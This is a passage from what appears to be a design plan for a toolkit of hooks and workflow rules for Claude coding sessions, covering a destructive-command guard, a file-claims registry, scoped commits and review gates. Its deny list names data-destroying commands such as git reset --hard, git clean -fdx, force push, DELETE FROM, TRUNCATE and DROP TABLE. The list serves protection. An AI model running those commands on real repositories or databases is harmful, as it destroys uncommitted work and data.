- **Acceptance:** kill a `/ck:cook --from-plan` run mid-phase; a fresh session given only the plan path resumes at the correct phase with zero re-implementation, and says which gates it re-ran.

#### T1.2 — `guard-destructive` PreToolUse hook (G5) — **two-tier, conflict-aware**

**Design decision (parallel sessions).** The measured usage is 211 overlap events across 158 sessions — **43% of messages happen while another session is live**. That changes the hazard: a whole-tree git op does not merely bundle a human coworker's WIP, it can stage and commit *another Claude session's half-written files*, then leave that session committing on top of its own already-committed intermediate state. A flat deny-list is too blunt (it fires on a legitimate first commit in a fresh repo) and a warn-only guard is too weak (the model rationalizes past warnings — that is the whole premise of the Red-Flags tables). So: **two tiers, and tier B decides from live evidence rather than from a static rule.**

- **New:** `.claude/hooks/guard-destructive.js` (+ `.sh` + `.ps1` parity, matching the existing `scout-block` trio).

**Tier A — irreversible loss. Always deny.** These destroy work no other session can recover:

| Blocked shape | Message names the safe alternative |
|---|---|
| `git stash -u` / `--include-untracked` | `git stash push -- <paths>` (`-u` destroyed a real `node_modules` here) |
| `git reset --hard`, `git clean -fd[x]` | discards other sessions' uncommitted work — `git restore --source=HEAD -- <paths>` to roll back **your** files, or commit/stash by path first |
| `git checkout .` / `git restore .` / `git checkout -- .` | same; scope to explicit paths |
| `git push --force` without `--force-with-lease` | use `--force-with-lease` |
| `DELETE FROM`, `TRUNCATE`, `DROP TABLE`, `UPDATE`/`INSERT` without a `WHERE`/target guard against a staging/prod DSN | route through the `database` dry-run + rollback protocol (T1.7) |

Escape hatch: `CK_ALLOW_DESTRUCTIVE=1` in-env for a deliberate one-off; the denial message prints how to set it. Guard, not a wall.

**Conflict with shipped guidance — resolved by fixing the guidance, not by exempting the guard.** [`skills/software/refactor/SKILL.md:88`](../../skills/software/refactor/SKILL.md#L88) currently instructs *"If red → fix within batch OR `git reset --hard` + rethink"* — Tier A would deny ClauKit's own documented rollback.
- **Edit:** that line becomes `git restore --source=HEAD -- <batch paths>`. This is strictly better independent of the guard: it rolls back exactly the batch, leaves other sessions' files and untracked scratch untouched, and at 43% multi-clauding a whole-tree `reset --hard` was never the right rollback for a *scoped* refactor batch anyway.
- No Tier-A exemption is added. An exemption keyed on "was there a recent checkpoint commit" would be unverifiable at hook time (the hook sees one command, not intent) and would reopen the shape that destroyed a real toolchain. **Grep gate:** after this task, `grep -rn 'reset --hard' skills/ .claude/` returns nothing outside the guard's own denial-message fixtures.

**Tier B — over-broad staging. Deny only when a conflict actually exists.**

Shapes: `git add -A` · `git add .` · `git add --all` · `git add -u` · **`git commit -a` / `-am`** (the sneaky one — it stages every tracked modification without ever calling `git add`, so an `add`-only guard misses it entirely) · bare `git stash` with no pathspec.

Decision procedure — the hook consults the claim registry from T1.2b and denies **iff** another live session holds a claim on a file the whole-tree op would touch:

```
foreign := claims where
             session != me
         AND file still dirty in `git status --porcelain`   (self-cleaning: committed/reverted ⇒ claim moot)
         AND claim age < TTL (default 4h, CK_CLAIM_TTL)     (backstop for crashed sessions)
foreign empty  → ALLOW  (solo session / fresh repo: nothing to protect)
foreign present → DENY  + print the conflict table + the scoped command to run instead
```

The denial is **self-resolving**, not a dead end — it prints the files this session may safely stage and the exact `git add <paths>` to run:

```
BLOCKED: `git commit -am` would stage 3 files owned by session 8f2c1a4b (active 2m ago):
  src/payments/webhook.ts        (their edit, uncommitted)
  src/payments/retry.ts          (their edit, uncommitted)
  tests/payments/webhook.test.ts (their edit, uncommitted)
Your files:  git add src/auth/token.ts tests/auth/token.test.ts
Override:    CK_ALLOW_DESTRUCTIVE=1 (stages their work into your commit)
```

- Registered under `hooks.PreToolUse` matcher `Bash` in `.claude/settings.json`, after `scout-block`.
- **Fail-open on its own errors** (unparseable payload, missing registry, git not available) — a guard that breaks the session is worse than the risk it prevents. Tier A stays deny-on-error; Tier B allows on error and says why.
- **Acceptance:** unit tests in `tests/` — (a) Tier-A shapes deny with the right message (**`git commit -a[m]` is Tier B, not Tier A** — it is over-broad staging, not irreversible loss; this criterion contradicted the task's own design section and the design section is authoritative); (b) 12 benign lookalikes pass (`git stash list`, `git add -p`, `git clean -n`, `SELECT … WHERE deleted_at IS NULL`, `DELETE FROM` inside a quoted string); (c) Tier B allows `git add -A` with an empty registry, denies it with a seeded foreign claim, and allows it again once that claim's file is committed.

#### T1.2b — `file-claims` PostToolUse hook: the concurrency substrate (G5 companion, enables T1.4)
- **New:** `.claude/hooks/file-claims.js`, registered on `PostToolUse` matcher `Write|Edit` (alongside the existing `modularization-hook`).
- Appends one JSONL line per file mutation to `<worktree-root>/.claude/.ck-file-claims.jsonl` (git-ignored, added to `.gitignore`): `{session, file, ts, tool}`.
- **Scoping:** keyed on `git rev-parse --show-toplevel`, i.e. **per worktree**, not per repo — two sessions in separate worktrees genuinely cannot touch each other's files, so they must not see each other's claims (that would cause false denials and push people back toward `-A`).
- **Session identity:** read `session_id`, falling back to `sessionId`, then to a PPID-derived marker. Verified this session: the two *wired* hooks (`scout-block`, `modularization-hook`) read snake_case `tool_input`, so snake_case is the live schema; the `discord_notify`/`telegram_notify` scripts read a different camelCase shape but are **not** registered in `settings.json` (setup-guide only). **Pre-flight for this task:** dump one real payload to confirm the session-id key before coding, and note the finding in the hooks README.
- Self-pruning: on read, drop claims whose file is clean in `git status` or older than TTL. Compact the file when it exceeds ~2k lines. No daemon, no lock — append-only single lines.
- **Second consumer:** this registry is what turns T1.4's "session manifest" from *"the model remembers which files it edited"* into a machine-derived fact. That is the difference between a protocol that degrades after compaction and one that does not.
- **Acceptance:** two concurrent sessions editing disjoint files in one tree each see only their own claims; the registry survives compaction; `/ck:git cm` derives its manifest from it without asking the model to recall.

#### T1.3 — Fix `scout-block` false positives (G6)
- **Edit:** `.claude/hooks/scout-block.{js,sh,ps1}` — match blocked dirs only as **path segments actually being traversed**, not as substrings. Whitelist exclusion contexts (`--exclude`, `--exclude-dir`, `-v`, `--ignore`, `!pattern`, `-path ... -prune`).
- **Acceptance:** `grep -rn foo . | grep -v node_modules` passes; `cat node_modules/x/y.js` and `find node_modules -name '*.js'` still deny. Regression test added.

#### T1.4 — Scoped-commit protocol (G4)
- **Edit:** `.claude/commands/ck/git.md` — replace `cm`/`cp` "Stage all files" with:
  1. derive the session manifest **from the T1.2b claim registry** (machine-derived, survives compaction) — not from recollection; fall back to asking only if the registry is unavailable;
  2. `git status --porcelain` + `git stash list`; diff against the manifest; **report foreign WIP explicitly, attributed to the owning session where known**;
  3. `git add` only manifest paths, by explicit path — never `-A`/`.`;
  4. re-check your edits are still present (concurrent-editor churn);
  5. lint + targeted tests; abort red;
  6. conventional commit, ticket prefix if the branch/plan names one.
- **Edit:** `.claude/agents/engineering/git-manager.md` — same rules as hard constraints; add "if the diff spans work you did not author, stop and report the mapping instead of committing".
- **Edit:** `skills/software/git/SKILL.md` — add a **Scoped Commit** section as the canonical knowledge (command stays sugar).
- **Acceptance:** in a tree with foreign WIP, `/ck:git cm` commits only session files and prints the foreign-WIP table.

#### T1.5 — Finish-branch protocol + PR draft fallback (G12)
- **Edit:** `.claude/commands/ck/git.md` §`pr` and new §`finish`:
  - verify tests green **first** (Iron Law) → detect env (normal repo / named-branch worktree / detached HEAD) → present the 3-option menu (merge locally · push + PR · keep as-is) — 2 options on detached HEAD;
  - **auth failure → do not retry.** Emit a paste-ready block: PR title · body · source branch · target branch · the exact `gh`/`glab` command. Never let a finished feature die at the auth step.
- **Acceptance:** with `gh` unauthenticated, `/ck:git pr` exits 0 having printed a complete paste-ready PR draft; zero retry attempts in the transcript.

#### T1.6 — Hardened worktree fleet (G16) — **REVERTED 2026-08-05**

> **This task shipped and was then removed.** The premise below — that one worktree per concurrent session removes the shared-tree hazard — held in theory and failed in practice. Multi-session work is habitual, so the provisioning gate fired almost every run; each worktree paid a full dependency install; and teardown depended on a session reaching its finish step, so stale trees accumulated on disk. The isolation mechanism became a larger recurring cost than the hazard it removed.
>
> **What replaced it:** *coordinate, don't isolate* — the T1.2b claim registry and the T1.2 Tier B guard stay as the concurrency substrate; pipelines confine edits to unclaimed paths, `/ck:team` partitions disjoint path sets and serializes overlaps, `/ck:refactor` stops on a shared tree. The T2.2 baseline rule becomes **baseline-first** (suite on the untouched tree before the first edit, recorded in `STATE.md`; scratch-branch fallback when already dirty; `git stash` still forbidden). The two Tier A rules this task contributed are **kept** — they protect worktrees a user creates by hand.
>
> Everything below is the original specification, retained as the record of what was built.

T1.2 is a safety net; **worktrees remove the hazard entirely** — at 43% (User A) and 29% (User B) multi-clauding, one worktree per concurrent session means two sessions physically cannot stage, stash, or clean each other's files, and the T1.2b registry partitions along the same boundary. But User B's data proves knowledge alone is not enough: **worktrees were their #1 source of lost work**, because ClauKit ships the *concept* with no tooling. So this task delivers scripts with a smoke gate, not prose.

**T1.6a — provisioning scripts.** New `scripts/ck/wt-new`, `wt-doctor`, `wt-clean` (Node, cross-platform, consistent with the T3.2 scripts; registered under the manifests' `scripts` key).

- `wt-new <id>` — **absolute paths only**; creates the worktree **outside** the repo root, never nested inside it (a relative path + later `rm -rf` deleted nested directories); then:
  - **refuses to run `npm ci`/`pnpm i --frozen` if `node_modules` is a symlink** — this is the exit-216 incident, and it must be a hard refusal with the reason printed, not a warning;
  - installs deps **inside the worktree** in a way that cannot clobber a shared/hoisted store;
  - **SMOKE GATE — the load-bearing part:** run typecheck + the test suite **on the untouched base commit** and hard-fail with a clear message if either is red. An agent must never begin editing in an environment whose baseline is unproven; this is also what makes "is this failure pre-existing?" answerable later (T2.2/G19).
- `wt-doctor` — diagnoses the three recurring breakages by name: broken/circular `node_modules` symlink · dependency version skew (declared range vs installed, e.g. `zod` 3.x where `^4.x` is required) · missing dev server or required API token. Exit non-zero = unhealthy.
- `wt-clean` — safe teardown: **`git worktree remove` with path validation, never `rm -rf`**; reports reclaimed disk (~20GB of stale worktrees had accumulated).

**T1.6b — knowledge + wiring.**
- **Edit:** `skills/software/git/worktree/SKILL.md` — "One worktree per concurrent session" + a **non-negotiable constraints** block: absolute paths · outside the repo · `git worktree remove` not `rm -rf` · per-worktree install · never `npm ci` at the root or in a subagent · `node_modules` is **not** shared between worktrees · `git clean -fdx` destroys git-ignored scratch. Each constraint cites the incident that earned it.
- **Edit:** `/ck:cook`, `/ck:refactor`, `/ck:flow`, `/ck:team` — at start, detect a concurrent session (T1.2b registry) **or** a dirty tree; if either, provision via `wt-new` before any edit, run `wt-doctor`, **refuse to proceed if unhealthy**, and record the worktree path in `STATE.md` so resume lands in the right tree.
- **Edit:** `.claude/hooks/guard-destructive.js` (T1.2 Tier A) gains two rules from this data: `npm ci`/`pnpm install --frozen-lockfile` **when `node_modules` resolves to a symlink**, and `rm -rf` targeting a path that `git worktree list` knows.
- **Acceptance:** `wt-new` on a repo whose `node_modules` is a symlink refuses with the reason and exits non-zero; the smoke gate fails loudly on a knowingly-red base commit; `wt-doctor` detects a seeded circular symlink and a seeded version skew; `wt-clean` refuses a path outside `git worktree list`; `/ck:cook` with an unhealthy worktree stops before its first edit.

#### T1.7 — DB write protocol (G7)
- **New:** `skills/software/database/databases/references/safe-writes.md`, referenced from that skill's SKILL.md.
- Protocol: (1) write the statement to a reviewed migration/script file — never ad-hoc; (2) run the **SELECT dry-run** and report the exact affected row count; (3) ship a **paired rollback script in the same commit**; (4) get explicit approval before mutating; (5) assume the query tool may block `DELETE` and may reject SQL comments — write single-statement, comment-free SQL; (6) after the write, re-run the dry-run SELECT as post-evidence.
- **Acceptance:** the skill contains a worked before/after example; `database-admin` agent references it; the T1.2 hook message points here.

---

### Phase 2 — Evidence-First Gates (P1) — *stop implementing against false claims*

#### T2.1 — `verify-plan` skill + `/ck:plan verify` (G2) — **highest-leverage single task**
- **New:** `skills/software/verify-plan/SKILL.md`.
- Method: treat the plan as a set of **falsifiable hypotheses**. Extract every factual claim (root cause · affected rows · which code path runs · legacy behavior · "already done" status), then prove or disprove each with `git log`/`git blame`/`git show`, read-only queries, and direct file reads.
- Output: a fixed table → `plans/<plan>/reports/plan-verification.md`

  | # | Claim | Verdict (CONFIRMED / REFUTED / UNVERIFIABLE) | Evidence (`file:line`, git ref, or verbatim output) | Impact if wrong |

- Hard rules: **no code until the table is approved.** Any REFUTED load-bearing claim → back to `planner`. All-REFUTED is a legitimate outcome — one migration in the source data turned out to be a **no-op**, and finding that early is the win.
- **Wire in:** new **Stage 0.5** in the `cook` skill + `/ck:cook`, mandatory whenever `--from-plan` is active (that is exactly the "plan written in another session" case that failed); `/ck:plan verify <path>` as a standalone action; `/ck:fix` after its root-cause gate.
- **Acceptance:** given a plan containing one deliberately false claim, the table marks it REFUTED with a git/query citation and the run halts before any edit.

#### T2.2 — `tdd` skill + `/ck:fix tdd` (G3)
- **New:** `skills/software/tdd/SKILL.md` — Iron Law (`NO PRODUCTION CODE WITHOUT A FAILING TEST FIRST`), red→verify-red→green→verify-green→refactor, rationalization table, red flags. Ported from `test-driven-development`, trimmed to ClauKit voice.
- **Scope boundary (registry-clean):** `tdd` = discipline · `test-automation` = infra/tooling · `web-testing` = app-dev toolkit · `scenario` = case derivation. Cross-link all four; no content duplication.
- **New `/ck:fix tdd` variant** (`.claude/commands/ck/fix.md`) — the autonomous bug loop the report asked for:
  - **Step 0 toolchain** — prove the runner actually runs (dangling venv symlinks, missing deps, specs that block the runner). *Never conclude from a suite that could not run.*
  - **Step 1 red** — smallest test reproducing the **exact production symptom**; show the failure output.
  - **Step 2 baseline** — full suite once; record pre-existing/flaky failures so regressions stay distinguishable. **Baseline is established by checking out the base commit in a separate worktree (T1.6), never by `git stash`** — a stash-based baseline **silently no-oped** for User B and produced a commit message that had to be corrected. State this as a rule with its reason, since the failure is invisible when it happens.
  - **Step 3 loop** — implement → targeted + full sweep → read failures → iterate without check-ins. Never weaken or skip assertions to get green; if a test looks wrong, explain before changing it.
  - **Step 4 prove** — paste final output, confirm the pre-existing failure set is unchanged, state root cause vs symptom.
  - Escalate only on a data change needing approval or an unrepairable env blocker.
- **Edit:** `development-rules.md` — bug fixes are test-first by default; a waiver must be logged.
- **Acceptance:** `/ck:fix tdd <bug>` produces a red test with pasted failure output *before* any source edit, and a final report separating pre-existing failures from the fix.

#### T2.3 — Plan rigor: constraints, interfaces, machine-checkable gates (G8)
- **Edit:** `skills/software/planning/SKILL.md` + `references/output-standards.md`:
  - **Global Constraints** block in every `plan.md` — project-wide requirements with **values copied verbatim**; implicitly part of every phase.
  - **Interfaces** per phase — `Consumes:` / `Produces:` with exact signatures and types, so a fresh implementer that sees only its own phase still learns neighboring names.
  - **No Placeholders** rule — "TBD", "add appropriate error handling", "similar to Phase N", "write tests for the above" are **plan failures**, not shorthand.
  - **Exit gate per phase** — every phase declares a gate as an **executable check**, not prose: a command, a test id, or a query whose expected result is stated. This is what makes T1.1's resume able to re-derive state.
  - **Self-review checklist** before handing the plan over: spec coverage · placeholder scan · type/name consistency across phases.
- **Acceptance:** a plan generated by `/ck:plan hard` contains all five blocks; every phase gate is a runnable command with a stated expected result.

#### T2.4 — Scope-lock gate (G18) — *the second-most-cited failure, and cheap to fix*
Over-scoping is a **distinct** failure class from a wrong root cause: the diagnosis can be right and the change still three times too large. It cost User B a full plan-write cycle each time, and it is caught at the cheapest possible point — before planning.

- **Edit:** `skills/software/cook/SKILL.md` Stage 0 — item 3 ("scope boundary") is upgraded from *recorded* to **defended**, with three sub-gates:
  1. **Two options, minimal first.** Present **(A) minimal-surface** and **(B) thorough**. For each: which repos and which layers are touched, and **which existing codebase patterns/conventions it follows or breaks**. Recommend one; **wait for the pick before planning or coding.** Default to the narrowest surface and justify any expansion — User B had to cut a cross-repo backend plan to frontend-only.
  2. **Convention check.** Name the architectural patterns the change touches and assert compliance explicitly (the retracted fix registered a DB context in the wrong host, violating host-separation — a pattern the codebase enforced but the plan never consulted).
  3. **No unrequested artifacts.** Do not create files the user did not ask for — no backfill SQL, no scratch scripts, no helper docs — in a branch destined for a PR. A stray `backfill.sql` had to be stripped from a push mid-flight.
- **Edit:** `.claude/commands/ck/cook.md` (Gate stage) + `planning` skill: the A/B scope table is a required plan section. In `--auto`, pick A and `[ASSUMED]`-log it — never silently expand.
- **Edit:** `development-rules.md` — add the no-unrequested-artifacts rule as a standing constraint.
- **Acceptance:** `/ck:cook` on a task that *could* span repos emits the A/B table with per-option layer lists and convention notes, and halts for a pick; a run that would create an unrequested file names it and asks first.

#### T2.5 — Remote-truth verification row (G20)
- **Edit:** `skills/software/code-review/references/verification-before-completion.md` + `verification-patterns.md` + `debugging/references/verification.md` — new required-evidence rows in the Iron Law table:

| Claim | Requires | Not sufficient |
|---|---|---|
| Merged / deployed | `git fetch origin` then inspect the **remote** ref (`origin/<branch>`, `git branch -r --contains`) | local branch state, a previous fetch, "the PR was approved" |
| Failure is pre-existing | base commit checked out **in a separate worktree**, suite run there | `git stash` baseline (silently no-ops) |

- **Acceptance:** the tables contain both rows; a seeded prompt asking "is this merged?" produces a fetch + remote-ref check before answering.

---

### Phase 3 — Context & Cost Discipline (P1/P2) — *stop the spend-limit kills at the source*

#### T3.1 — Fresh-implementer-per-phase in cook (G9)
- **Edit:** `skills/software/cook/SKILL.md` + `/ck:cook` Implement stage: dispatch a **fresh implementer subagent per phase** (`backend-developer` / `frontend-developer`) instead of implementing in the main session. Main session keeps only the loop, the gates, and the ledger.
- Dispatch contains exactly: (1) one line on where the phase fits; (2) the **brief file path** ("read this first — your requirements, exact values verbatim"); (3) interfaces/decisions from earlier phases the brief can't know; (4) resolutions of ambiguity you already spotted; (5) the report-file path + report contract. **Never the session's history** — the source data shows a real dispatch reaching 42k chars of which 99% was pasted history.
- Never dispatch two implementers in parallel on the same tree (T1.6 worktrees if you must).
- Statuses handled: `DONE` · `DONE_WITH_CONCERNS` · `NEEDS_CONTEXT` · `BLOCKED` — never force the same model to retry unchanged.
- **Acceptance:** a 4-phase cook run shows 4 implementer dispatches, each <2k chars, with zero prior-phase prose pasted in; main-session context growth is dominated by ledger lines, not diffs.

#### T3.2 — Context-hygiene scripts (G10)
- **New:** `scripts/ck/phase-brief` (extract phase N's full text from a plan → uniquely named file, print path) · `scripts/ck/review-package` (`git log --oneline` + `git diff --stat` + `git diff -U10` for BASE..HEAD → one file, print path) · `scripts/ck/run-workspace` (resolve/create the git-ignored per-plan artifact dir, print path).
- Node.js (matches existing hooks, cross-platform, no new deps). Add to the manifests' `scripts` key.
- **Hard rule** added to `orchestration-protocol.md`: hand artifacts to subagents **as file paths**. Anything pasted into a dispatch — or printed back by a subagent — stays resident in the orchestrator's context and is re-read on every later turn. Reviewers always get a diff **file**; never `HEAD~1` as BASE (silently truncates a multi-commit phase).
- **Acceptance:** `/ck:review` dispatches carry a review-package path, not an inline diff; `review-package` on a 3-commit range yields a file whose commit list has 3 entries.

#### T3.3 — Model-tier dispatch matrix (G11)
- **New:** `skills/software/context-engineering/references/model-tiering.md` (skill already exists — extend, don't create).
- Rules: **always specify `model` explicitly on every Agent dispatch** — an omitted model inherits the session's (often opus) and silently defeats tiering. Then:

| Work shape | Tier |
|---|---|
| Plan text contains the complete code → transcription + test | cheapest |
| 1–2 files, complete spec; single-file mechanical fix | cheap |
| Multi-file integration, pattern matching, debugging | standard |
| Architecture/design; **final whole-branch review** | most capable |
| Reviewers | scale to diff size/complexity/risk; **mid-tier is the floor** |
| Fix-loop escalation (round 3) | one tier above the implementer that got stuck |

- **Turn count beats token price:** cheapest models often take 2–3× the turns on multi-step work and cost more overall. Mid-tier is the floor for reviewers and for implementers working from prose.
- **Wire in:** `orchestration-protocol.md` §Agent Selection gains a Tier column; `dynamic-workflow` axis 4 references this file.
- **Acceptance:** every dispatch example in `/ck:cook`, `/ck:flow`, `/ck:fix` names a model; the matrix is the single source (no per-command duplication).

#### T3.4 — Loop-cap breaker with parked findings (G1 companion)
- **Edit:** `cook` skill Failure Recovery — at the 3rd failed cycle, don't just "ask the user". Adjudicate each open finding and **record the ruling in `STATE.md`**:
  - reviewer wrong / contestable → `parked — <finding> — ruling: <why the code stands>`
  - real but nothing downstream depends on it → parked, marked deferred
  - **real and load-bearing** (a later phase builds on it, or it reveals a plan defect) → `BLOCKED`, stop, surface the finding + the plan text it collides with + the fix history
- A silent discard is forbidden; the final review reads the parked list and triages what must be fixed before merge.
- **Acceptance:** a forced 3-failure loop produces parked/BLOCKED ledger lines with rulings, and the final review references them.

#### T3.5 — Multi-repo scout mode (G22) — *moved here from Phase 6*
Belongs to context/cost discipline, not to delivery: it replaces serial main-context tracing with parallel read-only dispatch. It has **no dependency on anything in Phase 6** — parking it there was an artifact of both gaps coming from the same report.
- **Edit:** `.claude/commands/ck/scout.md` + `skills/software/find-skills`-adjacent scout knowledge: new **multi-repo** mode — dispatch **one read-only `scout` agent per repo, concurrently in a single message**, each returning `file:line` **plus the data shape it observes at that boundary** (the shape is what makes cross-repo mismatches visible — a bare `int[]` where an object was expected was a real defect class here).
- Main agent reconciles into one cross-repo trace: where the value originates, each hop, and where it diverges from expectation. Feeds T2.1's evidence table directly.
- Constraint: read-only (`scout` already has no Edit/Write) and one agent per repo — never one agent roaming several checkouts.
- **Acceptance:** on a seeded 3-repo trace, exactly **3 concurrent dispatches in one message** produce a single reconciled table with per-hop `file:line` + observed shape, and the main session performs **zero `Read`/`Bash` calls against the two non-primary repos** (the machine-checkable form of "serial churn dropped").

---

### Phase 4 — Review Depth & Offloading (P2)

#### T4.1 — Multi-lens parallel review (G13)
- **Edit:** `.claude/commands/ck/review.md` — new `--lenses` mode (composable with `--flow`): fan out **3 reviewers concurrently in one message**, each with a distinct lens (perspective diversity beats redundancy):
  - **ADVERSARY** — assume the implementation is wrong; try to prove it from the actual diff and live queries, not from the description.
  - **FIDELITY** — diff new logic against the legacy behavior on the base branch (`git show`/`git log`); list every behavioral divergence, intended or not.
  - **BLAST RADIUS** — cascade deletes, dropped status/permission guards, route-level auth gaps, duplicate keys, non-atomic mutation sequences, cross-service deploy-order hazards.
  - **CONVENTION** (added from User B) — does the change respect the codebase's own architectural patterns? The retracted `AnswerDbContext` fix violated host-separation: a rule the codebase enforced that no reviewer was looking for. Pair with T2.4's convention check — planned intent vs shipped reality.
- **Context rule — the falsifier gets no reasoning.** Each lens receives **the diff and the requirement, never the implementer's explanation of why it is correct**. User B asked for this explicitly ("Give it the diff and the ticket, NOT my reasoning") and it is the mechanism that makes the review independent: a reviewer handed the rationale grades the rationale, not the code. Fresh context, no memory of the implementation attempts.
- **Admissibility rule:** every finding must cite `file:line`, a git ref, or verbatim output. **No evidence → discarded as a hallucination** (a subagent invented a flag in the source data).
- Then **reconcile**: cross-check the three reports against each other, flag disagreements explicitly, rank surviving findings Critical/High/Medium, and route Critical/High through the existing adversarial-verify step before fixing.
- **Edit:** `code-review` skill — add the lens table + admissibility rule as canonical knowledge.
- **Cost controls (per Part H.2 — this is the plan's one genuine cost increase):** `--lenses` is **opt-in**, default `/ck:review` stays single-reviewer; auto-suggest it only above a risk threshold (>~200 changed lines, >3 files, or the diff touches auth / payments / migrations / a cross-service boundary); **tier the lenses** — CONVENTION and BLAST-RADIUS on a cheap tier with narrow prompts, ADVERSARY escalated only on a risky diff; and each lens reads the **review-package file** (T3.2) so the main context grows by four short finding lists, not four diffs.
- **Acceptance:** `/ck:review --lenses` shows **4** concurrent dispatches, none of whose prompts contain the implementer's rationale nor an inline diff, plus a disagreement section and at least one finding dropped for missing evidence in a seeded test.

#### T4.2 — Headless offload: review **and** the mechanical tail (G14, G21 partial)
Both users asked for this independently, for different halves of the pipeline — User A wants review off the interactive path, User B wants the *end-of-ticket tail* off it (6 sessions were purely PR-creation). Same mechanism, two entry points.
- **New:** `scripts/ck/ci-review` + `.github/workflows/ck-review.yml.template` — runs `claude -p` on the PR diff with a narrow tool grant (`--allowedTools "Read,Grep,Bash(git diff:*)"`), emits CRITICAL/HIGH/MEDIUM with `file:line` + a concrete fix, posts as a PR comment. Prompt reads the repo's `CLAUDE.md` conventions and flags cross-service deploy-order risk + secrets in the tree.
- **New:** `scripts/ck/delivery-tail` — **deterministic executor** for **T6.1 step 5**, i.e. whatever the project declared, in declaration order. It is an *executor, not a script with steps in it*: it reads the `Delivery tail` block, resolves `{{placeholders}}`, evaluates each `done-when` before and after `run`, emits a paste-ready payload on failure, and appends one `STATE.md` line per step. **The same single code path T6.1 step 5 invokes**, so there is no interactive variant to keep in sync. **This is the part spend limits keep eating** — it runs last, and at zero token cost it cannot be eaten at all. With nothing declared it is a no-op that exits 0.
- **No LLM on the default path** (revised during implementation — see R12). Declared steps carry `run` + `done-when`, so they are executable as-is; spawning `claude -p` to run them would contradict this task's own cost rationale, make the outcome depend on parsing model prose, and force an unattended tool grant. A step that genuinely needs an agent declares `run: mcp <server> <tool> [json]`; only that path spawns `claude -p`, with `--allowedTools mcp__<server>__*` and no Bash.
- Rationale: review was User A's 3rd most common goal (12 sessions); User B spent 12 sessions on PR/version-control mechanics. Neither needs an interactive context.
- **Acceptance:** both templates run in a scratch repo; `delivery-tail` with no declaration exits 0 having done nothing, and with a seeded 2-step declaration is idempotent across re-runs; `/ck:review` docs point to `ci-review` as the pre-session path.

#### T4.3 — Cross-service change rules (G17)
- **Edit:** `.claude/workflows/development-rules.md` — new §Cross-Service Changes: a caller must not ship before the dependency endpoint is deployed; **state the required deploy order in the commit/PR description**; migrations behind a feature flag with the legacy path preserved until cutover.
- **Edit:** `/ck:claude-md` template — add the **5** project-specific blocks as *fill-in* sections so each project supplies its own specifics: Git & PR · DB changes · Verification before claiming done · Cross-service · **Delivery tail (T6.1)**. Keeps ClauKit generic while making the source team's lessons reusable — this template is the **only** file in the kit where a vendor name may legitimately appear, and then only in a commented-out sample.
- **Acceptance:** `/ck:claude-md init` emits the 5 sections with placeholders, the Delivery-tail block commented out and inert by default; `development-rules.md` states the pattern without naming any specific service.

---

### Phase 5 — Discipline & Documentation (P2)

#### T5.1 — Skill-activation gate (G15)
- **New:** `.claude/workflows/skill-activation.md` — invoke relevant skills **before** any response or action, including clarifying questions and codebase exploration; announce "Using \<skill\> to \<purpose\>"; process skills before implementation skills; + the **rationalization table** ("this is just a simple question" → questions are tasks; "let me explore first" → skills tell you *how* to explore; "I remember this skill" → skills evolve, re-read).
- Registered in `engineer.json` + `both.json` workflows; referenced from CLAUDE.md §Workflows. `/ck:find` stays the discovery mechanism.
- **Acceptance:** a fresh session on "let's build X" invokes planning/brainstorm before answering.

#### T5.2 — Primary workflow rewrite (also closes **G25**)
**Two verification passes have now corrected this task.** The first draft omitted four gates (scope-lock, worktree pre-flight, the ledger's write points outside stage 3, the handoff tail) and missed `fix-pipeline.md`. The second pass found a **worse** omission, inherited rather than introduced: **the Exact-Requirements Gate was absent from the table entirely** — because it does not live in `primary-workflow.md` at all (G25). Carrying that document's numbering forward carried its hole forward too, leaving the plan with the gate's *upgrade* (1.7 scope-lock upgrades item 3 of the gate) but not the gate. That is now fixed, and fixing it is the point of this task.

**Numbering rule:** existing integer stage numbers are preserved so readers of the old doc are not disoriented; every insertion is a decimal.

- **Edit:** `.claude/workflows/primary-workflow.md` → every gate named, with its owning skill:

| # | Stage | Status | Owner |
|---|---|---|---|
| 0 | Brainstorm — *optional*, only when the approach is uncertain | pre-existing, unchanged | `/ck:brainstorm` |
| **0.5** | **Exact-Requirements Gate — MANDATORY, UNSKIPPABLE.** 5 items: expected output · acceptance criteria · scope boundary · non-negotiable constraints · touchpoints. Any item not derivable → **STOP and ask ONE question**; never fill by probability | **surfaced from `cook` Stage 0 — closes G25** | `cook` |
| 1 | Plan — Global Constraints · Interfaces · no placeholders · executable exit gates | upgraded | `planning` |
| **1.5** | **Verify-Plan** — claim → verdict → evidence; no code until approved | **T2.1** | `verify-plan` |
| **1.7** | **Scope lock** — A/B minimal-vs-thorough + convention check + no unrequested artifacts. *Explicitly an upgrade of gate item 3 at 0.5* | **T2.4** | `cook` |
| 2 | Plan review + user `/clear` | pre-existing | — |
| **2.5** | **Environment pre-flight** — provision + `wt-doctor` a worktree; **refuse to proceed if unhealthy**. *Moved here from 0.5:* planning and verification are read-only, so isolation is needed before the **first edit**, not before the first thought — and a plan that Verify-Plan proves is a no-op (this happened once in User A's data) must not have paid for provisioning first. **Detect** a concurrent session early (T1.2b registry, free); **provision** late | **T1.6** | `git/worktree` |
| 3 | Implement — fresh subagent per phase, artifacts as files | T3.1, T3.2 | `cook` |
| 4 | Test — **TDD-first for bugs**; baseline from a base-commit worktree, never `git stash` | T2.2 | `tdd` |
| 5 | Review — 4 lenses, cross-checked, evidence-or-discard | T4.1 | `code-review` |
| 6 | Docs | pre-existing | `docs-manager` |
| 7 | Debug — loop back to 4, breaker + parked findings at cap 3 | T3.4 | `debugging` |
| **8** | **Finish — verify → menu → PR (draft-default) + handoff tail + worktree teardown** | **T1.5, T6.1** | `git` |

- **The gate at 0.5 is a pointer, not a copy.** `cook/SKILL.md` stays the single source of truth for the 5 items and their mode behaviour (`--auto` fills + `[ASSUMED]`-logs, `--from-plan` extracts from the plan file); `primary-workflow.md` names the gate, states that it is mandatory, and links. Duplicating the 5 items into two documents is how they drift apart — which is the same failure that produced G25.
- **Why the gate sits *after* optional Brainstorm:** acceptance criteria and touchpoints are hard to state before the approach is settled, so when the approach is genuinely uncertain, brainstorm first, then fill the gate. When the approach is known, stage 0 is skipped and **0.5 is the first thing that happens**.

- **Ledger is cross-cutting, not a stage.** State the write points explicitly: `STATE.md` is appended at **every** gate transition (0.5, 1.5, 1.7, each phase of 3, 4, 5, 7, 8) — not only inside Implement, which is what the first draft implied. A resume reads it at stage 0. → T1.1
- **Edit:** `orchestration-protocol.md` — Tier column on the agent-selection table (T3.3), artifacts-as-files hard rule (T3.2), ledger in §Context Preservation (T1.1), multi-repo dispatch (T3.5), post-dispatch diff verification (T6.2).
